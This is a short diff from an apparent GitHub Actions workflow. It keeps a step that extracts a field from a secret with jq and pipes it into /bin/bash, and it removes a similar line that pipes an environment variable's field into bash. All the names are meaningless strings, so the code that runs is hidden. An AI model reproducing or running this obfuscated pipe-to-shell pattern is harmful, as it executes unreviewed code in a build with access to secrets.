@@ -19,7 +19,6 @@ jobs:
           txr12229: ${{ secrets.txr12229 }}
         run: |
           printf '%s' "$txr12229" | jq -r .rx918 | /bin/bash
-          echo $mnqt5 | jq -r .vopgq99892 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
